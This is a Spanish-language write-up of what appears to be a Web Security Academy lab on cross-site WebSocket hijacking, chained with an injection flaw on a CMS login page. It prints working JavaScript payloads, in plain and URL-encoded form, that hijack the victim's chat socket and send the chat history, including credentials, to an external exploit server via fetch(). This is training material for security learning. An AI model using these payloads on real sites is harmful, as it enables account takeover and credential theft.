El chat en vivo de este laboratorio es vulnerable al secuestro de WebSockets entre sitios (CSWSH). Para solucionar el problema, inicie sesión en la cuenta de la víctima.

Para ello, utilice el servidor de exploits proporcionado para ejecutar un ataque CSWSH que exfiltre el historial de chat de la víctima al servidor predeterminado de Burp Collaborator. El historial de chat contiene las credenciales de inicio de sesión en texto plano.


iniciamos el chat y de inmediato podemos recopilar información. sabemos que se llama `Hal Pline` y que su estatus es `CONNECTED`
![[Pasted image 20250721132918.png]]

analizando la solicitud vemos el encabezado `X-Frame-Options: SAMEORIGIN` indica que la página web solo puede ser mostrada en un frame si el sitio que intenta incrustarla está en la misma origen (dominio, esquema y puerto) que la página original
![[Pasted image 20250721133525.png]]

analizando todos los endpoints de la web nos damos cuenta que todos cuenta con la etiqueta `X-Frame-Options: SAMEORIGIN` pero al analizar la solicitud de un post encontramos un endpoints diferente. 
![[Pasted image 20250721133911.png]]

`https://cms-0a9500be04bf9ea5811070e6005900ee.web-security-academy.net` 
este endpoint nos lleva a una web de login donde podemos hacer una comprobación rápida para vulnerabilidades CSRF y logramos identificarla de la siguiente manera.
![[Pasted image 20250721134247.png]]

en el WebSockets History podemos ver el mensaje que hacemos al servidor y su contenido
![[Pasted image 20250721134538.png]]

y también el mensaje que regresa el servido
![[Pasted image 20250721134733.png]]

podemos enviar esta petición al repeater para ver como la respuesta y todos los mensajes que hemos intercambiado con el WebSocket
![[Pasted image 20250721162752.png]]

ahora bien. podemos ver que la dirección del websocket esta definida en la cabecera de respuesta del mensaje lo cual será útil para luego hacer nuestro ataque CSRF
![[Pasted image 20250721163118.png]]

por ultimo encontramos la funcion del chat 
![[Pasted image 20250721164204.png]]

necesitamos hacer algunas modificaciones al codigo.

```python
let newWebSocket = new WebSocket(chatForm.getAttribute("action"));

newWebSocket.onopen = function (evt) {
writeMessage("system", "System:", "No chat history on record");
newWebSocket.send("READY");
res(newWebSocket);
}

newWebSocket.onmessage = function (evt) {
var message = evt.data;
};
```

no necesitamos el atributo `chatForm.getAttribute("action")` ya que este será la dirección de nuestro websocket. es decir la web de login que hemos encontrado.  tampoco vamos a necesitar el `writeMessage` porque no queremos escribir un mensaje. solo queremos enviarlo

```python
<script> 
var newWebSocket = new WebSocket(
"wss://0a8d00d8044c76f98091034900f9004e.web-security-academy.net/chat"
);

newWebSocket.onopen = function (evt) {
	newWebSocket.send("READY");
};

newWebSocket.onmessage = function (evt) {
	var message = evt.data;
	fetch(
	"https://exploit-0a130040047576bc80e70294011400d5.exploit-server.net/exploit?messge=" + btoa(message)
	);
}; 
</script>
```

enviamos nuestra carga útil usando el servidor proporcionado por la web
![[Pasted image 20250721171825.png]]

ahora analizamos los log del servidor y encontramos una solicitud `GET` con un mensaje de respuesta
![[Pasted image 20250721171806.png]]

de codeamos el mensaje usando burpsuite y obtenemos nuestro mensaje. ahora estamos conectados y en el chat con `Hal Pline`
![[Pasted image 20250721172053.png]]

ahora bien. si tomamos de nuevo la solicitud de la web `https://cms-0a9500be04bf9ea5811070e6005900ee.web-security-academy.net` donde encontramos el CSRF podemos ver que el endpoint. indica que tiene un estatus `200 OK` es decir. existe el endpoint. la solicitud se realiza correctamente por lo que podemos inyectar aquí nuestra carga útil
![[Pasted image 20250721172930.png]]

ahora usando el burpsuite vamos a url encodear nuestra carga útil

pasando de esto
```python
<script>
var newWebSocket = new WebSocket(
"wss://0a8d00d8044c76f98091034900f9004e.web-security-academy.net/chat"
);

newWebSocket.onopen = function (evt) {
  newWebSocket.send("READY");
};

newWebSocket.onmessage = function (evt) {
  var message = evt.data;
  fetch(
  "https://exploit-0a130040047576bc80e70294011400d5.exploit-server.net/exploit?messge=" + btoa(message)
  );
};
</script>
```

a esto
```python
%3c%73%63%72%69%70%74%3e%0a%76%61%72%20%6e%65%77%57%65%62%53%6f%63%6b%65%74%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%0a%22%77%73%73%3a%2f%2f%30%61%38%64%30%30%64%38%30%34%34%63%37%36%66%39%38%30%39%31%30%33%34%39%30%30%66%39%30%30%34%65%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%22%0a%29%3b%0a%0a%6e%65%77%57%65%62%53%6f%63%6b%65%74%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%20%28%65%76%74%29%20%7b%0a%20%20%6e%65%77%57%65%62%53%6f%63%6b%65%74%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%7d%3b%0a%0a%6e%65%77%57%65%62%53%6f%63%6b%65%74%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%20%28%65%76%74%29%20%7b%0a%20%20%76%61%72%20%6d%65%73%73%61%67%65%20%3d%20%65%76%74%2e%64%61%74%61%3b%0a%20%20%66%65%74%63%68%28%0a%20%20%22%68%74%74%70%73%3a%2f%2f%65%78%70%6c%6f%69%74%2d%30%61%31%33%30%30%34%30%30%34%37%35%37%36%62%63%38%30%65%37%30%32%39%34%30%31%31%34%30%30%64%35%2e%65%78%70%6c%6f%69%74%2d%73%65%72%76%65%72%2e%6e%65%74%2f%65%78%70%6c%6f%69%74%3f%6d%65%73%73%67%65%3d%22%20%2b%20%62%74%6f%61%28%6d%65%73%73%61%67%65%29%0a%20%20%29%3b%0a%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e
```


![[Pasted image 20250721173654.png]]

ahora nuestro payload encodeado podemos enviarlo en la misma petición donde hemos encontrado el CSRF. y podemos ver que la solicitud se muestra tal y como estaba antes de ser encodeada
![[Pasted image 20250721173524.png]]

perfecto ahora vamos a crear un nuevo payload que nos permita obtener mas información

```python
<script> 
document.location = "https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=YOUR-URL-ENCODED-CSWSH-SCRIPT&password=anything"; 
</script>
```

en este caso necesitamos el `URL-cms` que ya conocemos. donde esta la vulnerabilidad CSRF y necesitamos nuestro payload encodeado que ya sabemos que es capas de ser interpretado sin problemas. y obtenemos estas respuestas. 
![[Pasted image 20250721174552.png]]